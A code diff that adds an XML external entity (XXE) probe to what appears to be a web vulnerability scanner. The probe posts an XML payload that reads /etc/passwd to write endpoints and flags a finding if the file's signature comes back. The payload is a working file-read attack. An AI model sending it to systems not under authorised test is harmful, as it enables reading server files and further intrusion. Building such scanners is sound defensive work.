@@ -367,6 +367,63 @@ def host_header_injection_probe(model, base_url: str, *, session: requests.Sessi
     return out
 
 
+_XXE_PAYLOAD = ('<?xml version="1.0"?>\n'
+                '<!DOCTYPE qax [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+                '<qax>&xxe;</qax>')
+
+
+def xxe_probe(model, base_url: str, *, session: requests.Session | None = None,
+              auth: dict | None = None, limit: int = 8) -> list[ProbeFinding]:
+    """
+    XML external entity injection. POST an XML document whose external entity reads a
+    local file, and confirm by the /etc/passwd signature (`root:x:0:0`) in the response.
+
+    Zero-false-positive: that OS-file signature can only appear if the XML parser
+    resolved an external entity — a hardened parser (entities disabled) returns nothing
+    of the sort, and a JSON endpoint ignores the body. Only write endpoints are tried,
+    with Content-Type application/xml. P1. No model calls.
+    """
+    sess = session or requests.Session()
+    from core.auth_recipe import derive_auth_recipe
+    recipe = derive_auth_recipe(model)
+    base = base_url.rstrip("/")
+    out: list[ProbeFinding] = []
+
+    cands = [e for e in getattr(model, "endpoints", [])
+             if isinstance(e, dict) and str(e.get("method", "")).upper() in ("POST", "PUT", "PATCH")
+             and "{" not in str(e.get("path", ""))]
+    token = None
+    if any(e.get("auth_required") for e in cands):
+        token = _resolve_token(sess, base, recipe, model, f"xxe_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
+
+    seen: set = set()
+    for e in cands[:limit]:
+        method = str(e.get("method", "POST")).upper()
+        path = str(e.get("path", ""))
+        if path in seen:
+            continue
+        seen.add(path)
+        headers = {"Content-Type": "application/xml"}
+        if e.get("auth_required"):
+            headers.update(_auth_headers(token, auth))
+        try:
+            r = sess.request(method, f"{base}{path}", data=_XXE_PAYLOAD, headers=headers, timeout=15)
+        except Exception:
+            continue
+        if "root:x:0:0" in (r.text or ""):
+            out.append(ProbeFinding(
+                probe="xxe",
+                title=f"XML external entity (XXE) file read on {method} {path}",
+                exploited=True, severity="P1",
+                evidence=(f"An XML body with an external entity (file:///etc/passwd) sent to "
+                          f"{method} {path} returned the /etc/passwd signature 'root:x:0:0' — the "
+                          f"parser resolved external entities, so an attacker can read local files "
+                          f"(and often reach SSRF)."),
+                target=path))
+            break
+    return out
+
+
 def _jwt_algorithm(model) -> str:
     """Read the JWT algorithm from the model's config, defaulting to HS256."""
     for c in getattr(model, "config", []):
